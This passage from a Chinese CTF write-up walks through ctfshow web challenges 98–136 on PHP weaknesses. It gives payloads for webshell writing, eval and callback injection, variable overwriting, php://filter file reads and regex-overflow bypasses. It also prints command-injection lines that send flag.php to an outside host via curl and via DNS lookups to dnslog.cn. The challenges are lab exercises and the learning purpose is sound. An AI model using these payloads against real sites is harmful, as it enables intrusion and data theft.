class="string">&#x27;flag&#x27;</span>?<span class="variable">$flag</span>:__FILE__);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>想了想还是贴上代码，考到了三元运算符的运用</p>
<p>第一个是如果传入了一个get参数，那么就把这个方法转换为post方法，因为他赋值的时候把post的地址给了get，所以我们用GET方式传入一个参数之后还需要再POST方法传入一个同样的flag，仔细看一下下面两个三元判断是没用的，可以不用管</p>
<h3 id="web-99"><a href="#web-99" class="headerlink" title="web 99"></a>web 99</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">$</span><span class="bash">allow = array();<span class="comment">#将allow设置为数组</span></span></span><br><span class="line">for ($i=36; $i &lt; 0x36d; $i++) &#123; </span><br><span class="line">    array_push($allow, rand(1,$i));</span><br><span class="line">    #给数组里面插入随机数</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">if(isset($</span><span class="bash">_GET[<span class="string">&#x27;n&#x27;</span>]) &amp;&amp; in_array(<span class="variable">$_GET</span>[<span class="string">&#x27;n&#x27;</span>], <span class="variable">$allow</span>))&#123;</span></span><br><span class="line"><span class="meta">#</span><span class="bash">检查这个里面是否有我们输入的n的键值，in_array漏洞，如果没有设置第三个值的话那么我们输入的内容会自动转换n=1.php会转换成1</span></span><br><span class="line">    file_put_contents($_GET[&#x27;n&#x27;], $_POST[&#x27;content&#x27;]);</span><br><span class="line">    	#然后到这就可以写入一个一句话木马</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h3 id="web-100"><a href="#web-100" class="headerlink" title="web 100"></a>web 100</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;ctfshow.php&quot;);</span><br><span class="line">//flag in class ctfshow;#提示flag在ctfshow</span><br><span class="line"><span class="meta">$</span><span class="bash">ctfshow = new ctfshow();<span class="comment">#新建一个ctfshow对象</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">v1=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v2=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v3=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v0=is_numeric(<span class="variable">$v1</span>) and is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);<span class="comment">#因为and的优先级比=低，所以我们只需要v1传入数字就行了</span></span></span><br><span class="line"><span class="meta">if($</span><span class="bash">v0)&#123;</span></span><br><span class="line">    if(!preg_match(&quot;/\;/&quot;, $v2))&#123;#v2中不含有分号</span><br><span class="line">        if(preg_match(&quot;/\;/&quot;, $v3))&#123;#v3中含有分号</span><br><span class="line">            eval(&quot;$v2(&#x27;ctfshow&#x27;)$v3&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>非预期：因为什么也没有过滤所以直接命令执行就行</p>
<p>预期解：用ReflectionClass类反弹（引用一下羽师傅的wp讲解）</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A&#123;</span><br><span class="line">public static $flag=&quot;flag&#123;123123123&#125;&quot;;</span><br><span class="line">const  PI=3.14;</span><br><span class="line">static function hello()&#123;</span><br><span class="line">    echo &quot;hello&lt;/br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">$</span><span class="bash">a=new ReflectionClass(<span class="string">&#x27;A&#x27;</span>);</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getConstants());  获取一组常量</span></span><br><span class="line">输出</span><br><span class="line"> array(1) &#123;</span><br><span class="line">  [&quot;PI&quot;]=&gt;</span><br><span class="line">  float(3.14)</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getName());    获取类名</span></span><br><span class="line">输出</span><br><span class="line">string(1) &quot;A&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getStaticProperties()); 获取静态属性</span></span><br><span class="line">输出</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [&quot;flag&quot;]=&gt;</span><br><span class="line">  string(15) &quot;flag&#123;123123123&#125;&quot;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a-&gt;getMethods()); 获取类中的方法</span></span><br><span class="line">输出</span><br><span class="line">array(1) &#123;</span><br><span class="line">  [0]=&gt;</span><br><span class="line"><span class="meta">  object(ReflectionMethod)#</span><span class="bash">2 (2) &#123;</span></span><br><span class="line">    [&quot;name&quot;]=&gt;</span><br><span class="line">    string(5) &quot;hello&quot;</span><br><span class="line">    [&quot;class&quot;]=&gt;</span><br><span class="line">    string(1) &quot;A&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">原文链接：https://blog.csdn.net/miuzzx/article/details/109168454</span><br></pre></td></tr></table></figure>

<p>也就是说我们直接输出new ReflectionClass(‘ctfshow’)</p>
<p>他就会直接输出里面的内容</p>
<h3 id="web-101"><a href="#web-101" class="headerlink" title="web 101"></a>web 101</h3><p>用100的预期解</p>
<h3 id="web-102"><a href="#web-102" class="headerlink" title="web 102"></a>web 102</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="meta">$</span><span class="bash">v1 = <span class="variable">$_POST</span>[<span class="string">&#x27;v1&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v2 = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v3 = <span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span></span><br><span class="line"><span class="meta">$</span><span class="bash">v4 = is_numeric(<span class="variable">$v2</span>) and is_numeric(<span class="variable">$v3</span>);</span></span><br><span class="line"><span class="meta">if($</span><span class="bash">v4)&#123;</span></span><br><span class="line">    $s = substr($v2,2);#截取v2从2开始的后续字符</span><br><span class="line">    $str = call_user_func($v1,$s);#将v1作为回调函数，将s传入</span><br><span class="line">    echo $str;#输出str</span><br><span class="line">    file_put_contents($v3,$str);#将其中的数传入v3中</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    die(&#x27;hacker&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>他调用v1，v1没有任何过滤所以它可以执行任何函数，也就是说我们可以把构造的数字字符串转换成标准字符串hex2bin，特殊字符是无法转换成16进制的，但是因为他对V3没有任何过滤，也就是我们可以用伪协议来读取我们输入的数据，也就是说我们可以对我们的数据进行base64加密，然后再转换成16进制，而且需要保证转化成的16进制除了e之外没有别的字母才可以被判断成数字字符串（因为V2取第二个之后的，所以我们解码完成之后再前面需要添加两位，因为他是四个一组，而他的总共长度只有30我们正好可以在前面添加两个数字，一二开头的两位数好像都可以把）</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`cat *`;</span><br></pre></td></tr></table></figure>

<h3 id="web-103"><a href="#web-103" class="headerlink" title="web 103"></a>web 103</h3><p>跟上面一条相比增加了一层过滤但是是在str里面所以直接用上面的就可以</p>
<h3 id="web-104"><a href="#web-104" class="headerlink" title="web 104"></a>web 104</h3><p>他对v1 v2没有任何要求，他们俩相等就行</p>
<h3 id="web-105"><a href="#web-105" class="headerlink" title="web 105"></a>web 105</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">error_reporting(0);</span><br><span class="line"><span class="meta">$</span><span class="bash">error=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span></span><br><span class="line"><span class="meta">$</span><span class="bash">suces=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span></span><br><span class="line"><span class="meta">foreach($</span><span class="bash">_GET as <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;<span class="comment">#对GET进行遍历</span></span></span><br><span class="line">    if($key===&#x27;error&#x27;)&#123;#参数不能有error</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;#进行覆盖赋值</span><br><span class="line">&#125;foreach($_POST as $key =&gt; $value)&#123;#对POST参数进行遍历</span><br><span class="line">    if($value===&#x27;flag&#x27;)&#123;#参数不能有flag</span><br><span class="line">        die(&quot;what are you doing?!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    $$key=$$value;#覆盖赋值</span><br><span class="line">&#125;</span><br><span class="line">if(!($_POST[&#x27;flag&#x27;]==$flag))&#123;</span><br><span class="line">    die($error);</span><br><span class="line">&#125;</span><br><span class="line">echo &quot;your are good&quot;.$flag.&quot;\n&quot;;</span><br><span class="line"><span class="meta">die($</span><span class="bash">suces);</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>suces=flag     = 》   $suces = $flag绕过第一个flag</p>
<p>error = suces   =》 $error = $suces    = 》$error = $flag</p>
<p>flag直接不传，进入下面的if然后直接输出error</p>
<h3 id="web-106"><a href="#web-106" class="headerlink" title="web 106"></a>web 106</h3><p>数组绕过</p>
<h3 id="web-107"><a href="#web-107" class="headerlink" title="web 107"></a>web 107</h3><p>parse_str — 将字符串解析成多个变量</p>
<p>也就是说我们V1需要传入一组key=value的形式key是flag要他的value等于v3MD5之后的值，我们可以找MD5之后为0e开头的数然后让flag = 0</p>
<h3 id="web-108"><a href="#web-108" class="headerlink" title="web 108"></a>web 108</h3><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<p>所以随便输入一串字符串然后截断后面填写我们需要的数字877的反转778</p>
<h3 id="web-109"><a href="#web-109" class="headerlink" title="web 109"></a>web 109</h3><p>可以抛出一个异常，或者用上面的反射类，直接反射出其中v2中的内容v2构造system(‘cat fl36dg.txt’)</p>
<h3 id="web-110"><a href="#web-110" class="headerlink" title="web 110"></a>web 110</h3><p>学到一个类：获取<strong>指定目录</strong>下的所有文件的类 <code>FilesystemIterator</code></p>
<p>以及一个函数：返回当前目录：getcwd</p>
<p>但是我的flag文件好像不在第一个，没拿到flag，解法没错的</p>
<h3 id="web-111"><a href="#web-111" class="headerlink" title="web 111"></a>web 111</h3><p>题目的意思是v1得等于ctfshow然后V2必须是全是英文字符然后赋值给v1执行var_dump，因为没有给其他的变量，所以我们可以用全局变量来解决，直接构造var_dump(GLOBALS)</p>
<h3 id="web-112"><a href="#web-112" class="headerlink" title="web 112"></a>web 112</h3><p>直接用伪协议读取flag.php就好了</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-113"><a href="#web-113" class="headerlink" title="web 113"></a>web 113</h3><p>过滤了filter，另找方法：compress.zlib://这个函数相当于gzpoen，因为括号被禁用所以用这个替代</p>
<p><strong>gzopen（）</strong>，一般用来打开gzip文件读写，可用于读取非gzip格式的文件；在这种情况下，<a class="link" target="_blank" rel="noopener" href="https://runebook.dev/zh-CN/docs/php/function.gzread">gzread（）<i class="fas fa-external-link-alt"></i></a>将直接从文件读取而不进行解压缩。</p>
<p>据说还有一种方法绕过is_file:</p>
<p>file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php</p>
<p><strong>在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容.多次重复后可以绕过is_file</strong></p>
<h3 id="web-114"><a href="#web-114" class="headerlink" title="web 114"></a>web 114</h3><p>这里虽然过滤了compress但是又把filter放出来了，过滤了convert过滤器，我们可以不经过过滤直接读</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/resource=flag.php</span><br></pre></td></tr></table></figure>

<h3 id="web-115"><a href="#web-115" class="headerlink" title="web 115"></a>web 115</h3><p>我们需要输入这个num但是num要经过trim过滤</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： </span><br><span class="line">◦ &quot; &quot; (ASCII 32 (0x20))，普通空格符。  </span><br><span class="line">◦ &quot;\t&quot; (ASCII 9 (0x09))，制表符。  </span><br><span class="line">◦ &quot;\n&quot; (ASCII 10 (0x0A))，换行符。  </span><br><span class="line">◦ &quot;\r&quot; (ASCII 13 (0x0D))，回车符。  </span><br><span class="line">◦ &quot;\0&quot; (ASCII 0 (0x00))，空字节符。  </span><br><span class="line">◦ &quot;\x0B&quot; (ASCII 11 (0x0B))，垂直制表符。 </span><br></pre></td></tr></table></figure>

<p>然后还要经过上面的替换，这个过滤的话，我们可以写一个简单的fuzz</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">for($</span><span class="bash">i=0;<span class="variable">$i</span>&lt;129;<span class="variable">$i</span>++)&#123;</span></span><br><span class="line"><span class="meta">	$</span><span class="bash">s = chr(<span class="variable">$i</span>).<span class="string">&#x27;1&#x27;</span>;</span></span><br><span class="line"><span class="meta">	if(is_numeric($</span><span class="bash">s) and tirm(<span class="variable">$s</span>)!==<span class="string">&#x27;1&#x27;</span>)</span></span><br><span class="line"><span class="meta">		echo(urlencode(chr($</span><span class="bash">i).<span class="string">&#x27;\n&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">%</span><span class="bash">0c  换页符</span></span><br><span class="line"><span class="meta">%</span><span class="bash">2B   +</span></span><br></pre></td></tr></table></figure>

<p>加会被替换所以用%0c36</p>
<h3 id="web-123"><a href="#web-123" class="headerlink" title="web 123"></a>web 123</h3><p>php的变量名是只能有数字字母下划线的，其中的<code>空格 + [ .</code>会被替换成下划线，但是有一个特性可以变量里面出现<code>.</code>那就是<code>[</code>这个符号出现之后被替换成下划线但是后面的符号是不会被替换的，后面的点也就会维持原样</p>
<p>CTF_SHOW.COM =&gt;CTF[SHOW.COM=&gt;CTF_SHOW.COM</p>
<p>然后进入eval($c.’;’)，没有任何过滤直接<code>echo $flag</code></p>
<h3 id="web-125"><a href="#web-125" class="headerlink" title="web 125"></a>web 125</h3><p>没有过滤highlight_file，给fun一个get传参，然后gei传入一个flag.php</p>
<h3 id="web-126"><a href="#web-126" class="headerlink" title="web 126"></a>web 126</h3><p><code>$a=$_SERVER[&#39;argv&#39;];</code>这个函数在我们输入参数时进行记录或者覆盖</p>
<p>比如：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="meta">$</span><span class="bash">a=<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span></span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">a);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>当我们直接传入参数时她会记录在数组中</p>
<p>比如我们传入aaa=bbb时她会返回<code>array(1) &#123; [0]=&gt; string(7) &quot;aaa=bbb&quot; &#125;</code></p>
<p>这样我们就可以将其分割成数组形式进行变量覆盖parse_str进行分割</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">get：?c=1+fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])</span><br><span class="line">或者直接用assert也行</span><br><span class="line">get:?$fl0g=flag_give_me</span><br><span class="line">post:CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=assert($a[0])</span><br><span class="line">因为assert中传入字符串是会当作代码执行，也就是说我们直接把flag_give_me赋值给了fl0g</span><br></pre></td></tr></table></figure>

<h3 id="web-127"><a href="#web-127" class="headerlink" title="web 127"></a>web 127</h3><p>fuzz一下看一下没有被过滤的字符</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">space % &amp; 0 1 2 3 4 5 6 7 8 9 = ? A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z | </span><br></pre></td></tr></table></figure>

<p>我们需要构造覆盖，但是下划线被过滤了，我们知道有几个字符在get传参是会自动转换成下划线<code>space [ . + </code></p>
<p>而且后面三个都被过滤了所以用空格就行</p>
<h3 id="web-128"><a href="#web-128" class="headerlink" title="web 128"></a>web 128</h3><p>学到一个骚姿势：</p>
<p>gettext()    或者_()</p>
<p>她会实现程序的国际化：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">假如你的没有国际化的程序里有这样的代码，echo &quot;你好&quot;;,而国际化的程序你要写成 echo gettext(&quot;你好&quot;);，然后再在配置文件里添加“你好”相对应的英文“Hi”。</span><br><span class="line">这时，中国地区浏览都会在屏幕上输出“你好”，而美国地区浏览都会在屏幕上输出“Hi”。也就是说，最终显示什么是根据你的配置文件而定的，如果找不到配置文件，才会输出程序里面的内容。</span><br></pre></td></tr></table></figure>

<p>这样我们就可以查看后面文件中的内容</p>
<p>_(get_defined_vars)之后就会变成</p>
<p>call_user_func(get_defind_vars)直接会返回已经定义的变量数组</p>
<h3 id="web-129"><a href="#web-129" class="headerlink" title="web 129"></a>web 129</h3><p>题目得到意思是我们输入的f里面一定要包含ctfshow而且不能在第一位，而且运用的是readfile函数，那么我们就可以想到这个题目意思应该是我们需要猜测flag所在目录，因为必须要包含ctfshow，那么就应该是有一个ctfshow文件夹的存在，我们直接退出目录然后从根目录打开/vat/www/html/flag.php</p>
<h3 id="web-130"><a href="#web-130" class="headerlink" title="web 130"></a>web 130</h3><p>.表示任意单个字符，+表示必须匹配1次或多次，+?表示 重复1次或更多次，但尽可能少重复</p>
<p>题目的意思应该是ctfshow之前不能存在东西，然后ctfshow必须在我们输入的数的第一位</p>
<p>直接f=ctfshow</p>
<h3 id="web-131"><a href="#web-131" class="headerlink" title="web 131"></a>web 131</h3><p>正则匹配的回溯次数有上线，100万，当我们输入的值超过这个值的时候，他就会溢出，返回直接返回false</p>
<p>也就是说我们在36Dctfshow之前传入一个溢出值，他就会直接绕过第一个正则判断</p>
<p>也就是输入一百万个字符，我们可以直接用四个字符*250000后面接一个36Dctfshow就可以</p>
<h3 id="web-132"><a href="#web-132" class="headerlink" title="web 132"></a>web 132</h3><p>&amp;&amp;运算符：全1出1，当左边为0时不计算直接返回0</p>
<p>题目要code是1到877的随机数，如果直接不管他就会直接进后面的||运算，所以我们只需要username=admin就行了</p>
<p>进入到下面的一个判断，需要code等于admin，那么我们直接设定code=admin,username=admin,password=1</p>
<p>就行了</p>
<h3 id="web-133"><a href="#web-133" class="headerlink" title="web 133"></a>web 133</h3><p>题目的意思是可以执行命令但是没有回显</p>
<p>我们直接分号截断他的substr就行了</p>
<p>因为只有6个字符，所以我们可以覆盖</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">f=`$f`;</span><br><span class="line">这样不仅进行了截断还可以继续执行后面我们输入的语句</span><br><span class="line">比如</span><br><span class="line">f=`$f`;+sleep 3;</span><br><span class="line">当我们运行的时候网页确实sleep了</span><br><span class="line">说明我们后面的文件执行了</span><br><span class="line">但是为什么会执行呢</span><br><span class="line">因为我们进行了覆盖</span><br><span class="line">那么现在也就是``$f`; sleep 3;`</span><br><span class="line">``是shell_exec的缩写</span><br><span class="line">也就是shell_exec(`$f`; sleep 3)</span><br><span class="line">前面不用管，后面的函数我们是可以进行控制的</span><br><span class="line">因为他没有回显，我们就可以用反弹shell或者外带的形式，把flag.php给传到我们自己的网站这里来</span><br></pre></td></tr></table></figure>

<p>可以用bp接收</p>
<p>payload:</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">f=`$f`;+curl -X POST -F xx=@flag.php http://+bp给的网址</span><br></pre></td></tr></table></figure>

<p>详细操作：</p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_1.png" alt="1"></p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_2.png" alt="1"></p>
<p><img src="/2022/02/22/ctf-show(%E7%88%86%E7%A0%B4-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-sql%E6%B3%A8%E5%85%A5-php%E7%89%B9%E6%80%A7)/web133_3.png" alt="1"></p>
<p>拿到flag.php文件</p>
<h3 id="web-134"><a href="#web-134" class="headerlink" title="web 134"></a>web 134</h3><p>由<code>extract（$_POST）</code>以及<code>parse_str($_SERVER[&#39;QUERY_STRING&#39;])</code></p>
<p>组合成的数组覆盖漏洞</p>
<p>首先进入题目是get以及post方式都不能传入key1、key2但是下面得判断key1、key2等于36d</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">parse_str — 将字符串解析成多个变量</span><br><span class="line">extract — 从数组中将变量导入到当前的符号表</span><br></pre></td></tr></table></figure>

<p>测试一下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php				url?_POST[key1]=1</span><br><span class="line"><span class="meta">$</span><span class="bash">key1 = 0;</span></span><br><span class="line">echo &quot;&#123;$key1&#125;&quot;;</span><br><span class="line"><span class="meta">@parse_str($</span><span class="bash">_SERVER[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&quot;;</span><br><span class="line"><span class="meta">var_dump($</span><span class="bash">_POST);</span></span><br><span class="line"><span class="meta">#</span><span class="bash">var_dump(get_defined_vars());</span></span><br><span class="line"><span class="meta">extract($</span><span class="bash">_POST);</span></span><br><span class="line">echo &quot;&lt;br /&gt;&#123;$key1&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">array(1) &#123; [&quot;key1&quot;]=&gt; string(1) &quot;1&quot; &#125;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>可以看到第一开始的时候key1是0但是经过下面的分解之后他将我们在url上面赋值的_POST[key1]=1覆盖原本post值的内容，然后对post进行一个extract</p>
<p>解析成变量名：也就是说我们现在又执行了$key1=1又对key1进行了一次赋值这样可以更改他的值变成36d</p>
<h3 id="web-135"><a href="#web-135" class="headerlink" title="web 135"></a>web 135</h3><p>是133plus：</p>
<p>相较上面多过滤了一些函数，curl被过滤了，主要考的还是外带信息，可以用ping</p>
<p>前面跟上面还是一样的但是由curl变成了ping，因为在dnslog不能全回显，所以我们西药用awk以及nr配合读取行数，刚开始读取还是不行我们需要添加一层“正则”匹配一下flag中的数字还有字母，这样才能回显</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload</span><br><span class="line">?F=`$F `; ping `nl f*|awk &#x27;NR==15&#x27;|tr -cd &quot;[a-z]&quot;/&quot;[0-9]&quot;`.a33jsr.dnslog.cn -c 1</span><br></pre></td></tr></table></figure>

<p>还有一种方法，就是直接重定向到一个我们新建的文件中，直接访问下载就能拿到flag</p>
<p><code>nl f*&gt;xxx</code></p>
<p>然后访问xxx文件就行了</p>
<h3 id="web-136"><a href="#web-136" class="headerlink" title="web 136"></a>web 136</h3><p>没有过滤写文件tee,我们可以将前面查询的内容输出到文件</p>
<p><code>ls /|tee 1</code>可以将根目录的文件写入1文件中然后将找到的flag文件写入到另一个文件中访问下载即可</p>
<p>骚姿势：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls |xargs sed -i &#x27;s/die/echo/&#x27;</span><br><span class="line">ls |xargs sed -i &#x27;s/exec/system/&#x27;</span><br></pre></td></tr></table></figure>

<p>通过php内部语言将网页中的php代码更改，然后直接命令执行</p>
